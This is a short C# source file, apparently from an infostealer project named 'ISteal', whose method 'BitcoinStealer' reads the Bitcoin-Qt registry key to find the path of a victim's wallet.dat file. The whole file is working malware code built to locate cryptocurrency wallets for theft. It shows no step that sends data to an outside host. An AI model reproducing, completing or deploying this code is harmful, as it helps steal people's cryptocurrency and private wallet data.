using Microsoft.Win32;

namespace ISteal.Password
{
    internal class Wallet
    {
        public static string BitcoinStealer()
        {
            try
            {
                using (var registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
                {
                    return registryKey.GetValue("strDataDir") + "wallet.dat";
                }
            }
            catch
            {
                return "Wallet not found!";
            }
        }
    }
}